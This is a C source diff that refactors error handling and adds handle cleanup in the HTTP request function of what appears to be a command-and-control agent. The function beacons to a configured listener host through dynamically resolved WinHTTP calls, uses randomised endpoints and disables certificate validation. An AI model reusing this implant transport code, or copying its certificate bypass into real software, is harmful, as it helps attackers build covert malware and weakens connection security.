@@ -1,9 +1,9 @@
 #include "Http.h"
 #include "localcstd.h"
 
-INT PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) {
-	HINTERNET hConnect;
-	HANDLE hRequest;
+BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) {
+	HINTERNET hConnect = NULL;
+	HANDLE hRequest = NULL;
 	
 	DWORD HTTP_FLAGS = 0;
 	LPWSTR HttpEndpoint = { 0 };
@@ -17,7 +17,7 @@ INT PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) 
 
 	if (!hSession) {
 		printf("[!] Failure to create http session token: [%08x]\n", GetLastError());
-		return INVALID_HANDLE_VALUE ;
+		goto EXIT;
 	}
 	HTTP_FLAGS = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 	HttpEndpoint = generateRandomStringW(10);
@@ -26,14 +26,14 @@ INT PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) 
 	{
 		if (!(hConnect = agent->apis->pWinHttpConnect(hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTPS_PORT, 0))) {
 			printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
-			return INVALID_HANDLE_VALUE;
+			goto EXIT;
 		}
 
 		HTTP_FLAGS |= WINHTTP_FLAG_SECURE;
 
 		if (!(hRequest = agent->apis->pWinHttpOpenRequest(hConnect,(LPCWSTR) agent->config->listenerConfig->Method, HttpEndpoint, NULL, NULL, NULL, HTTP_FLAGS))) {
 			printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
-			return INVALID_HANDLE_VALUE;
+			goto EXIT;
 		}
 
 		HTTP_FLAGS = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
@@ -44,18 +44,18 @@ INT PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) 
 		if (!agent->apis->pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HTTP_FLAGS, sizeof(DWORD)))
 		{
 			printf("[!] Failure to set HTTP OPTIONS => [%08x]", GetLastError());
-			return INVALID_HANDLE_VALUE;
+			goto EXIT;
 		}
 	}
 	
 	else {
 		if (!(hConnect = agent->apis->pWinHttpConnect(hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTP_PORT, 0))) {
 			printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
-			return INVALID_HANDLE_VALUE;
+			goto EXIT;
 		}
 		if (!(hRequest = agent->apis->pWinHttpOpenRequest(hConnect, agent->config->listenerConfig->Method, generateRandomStringW(10), NULL, NULL, NULL, 0))) {
 			printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
-			return INVALID_HANDLE_VALUE;
+			goto EXIT;
 		}
 	}
 	
@@ -80,12 +80,12 @@ INT PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) 
 				&StatusSize,
 				WINHTTP_NO_HEADER_INDEX)) {
 				printf("[!] Failure to query status code [%d]\n", StatusCode);
-				return INVALID_HANDLE_VALUE;
+				goto EXIT;
 			}
 
 			if (StatusCode != HTTP_STATUS_OK) {
 				printf("[!] Failure to perform request [%d]\n", StatusCode);
-				return INVALID_HANDLE_VALUE;
+				goto EXIT;
 			}
 
 			if (Response)
@@ -109,16 +109,32 @@ INT PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) 
 
 				} while (Success == TRUE);
 			}
+			else { // no response needed. Uusally for metadata requests. 
+				Success = TRUE;
+				goto EXIT;
+			}
 		}
 		else {
 			printf("[!] Failure to receive response: [%08x]\n", GetLastError());
-			return INVALID_HANDLE_VALUE;
+			goto EXIT;
 	
 		}
 	}
 	else {
 		printf("Error sending request: [%08x]\n", GetLastError());
-		return -1;
+		goto EXIT;
 	}
+EXIT:
+	if (hRequest) {
+		agent->apis->pWinHttpCloseHandle(hRequest);
+	}
+	if (hConnect) {
+		agent->apis->pWinHttpCloseHandle(hConnect);
+	}
+	if (hSession) {
+		agent->apis->pWinHttpCloseHandle(hSession);
+	}
+
+
 	return 0;
 }
